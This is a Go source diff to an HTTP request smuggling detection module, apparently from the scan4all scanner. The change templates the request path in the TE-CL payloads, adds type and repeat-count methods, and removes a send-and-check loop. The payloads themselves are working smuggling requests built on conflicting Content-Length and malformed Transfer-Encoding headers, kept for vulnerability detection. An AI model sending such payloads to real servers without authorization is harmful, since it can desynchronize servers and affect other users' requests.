@@ -1,11 +1,10 @@
 package Smuggling
 
 import (
-	"github.com/hktalent/scan4all/lib/socket"
 	"strings"
 )
 
-var TeClPayload = []string{`POST / HTTP/1.1
+var TeClPayload = []string{`POST %s HTTP/1.1
 Host: %s
 Content-Type: application/x-www-form-urlencoded
 Content-length: 4
@@ -20,7 +19,7 @@ x=1
 0
 
 
-`, `GET / HTTP/1.1
+`, `GET %s HTTP/1.1
 Host: %s
 Transfer-Encoding: chunkedchunked
 
@@ -46,6 +45,9 @@ func init() {
 type TeCl struct {
 }
 
+func (r *TeCl) GetTimes() int {
+	return 1
+}
 func (r *TeCl) CheckResponse(body string) bool {
 	return "" != body && (-1 < strings.Index("Unrecognized method GPOST", body) || 3 < len(strings.Split(body, "HTTP/1.1")))
 }
@@ -54,12 +56,6 @@ func (r *TeCl) GetPayloads() *[]string {
 	return &TeClPayload
 }
 
-func (r *TeCl) Check(rc *socket.CheckTarget) {
-	for _, x := range TeClPayload {
-		s := rc.SendOnePayload(x, 1)
-		if r.CheckResponse(s) {
-
-			break
-		}
-	}
+func (r *TeCl) GetVulType() string {
+	return "TE-CL"
 }
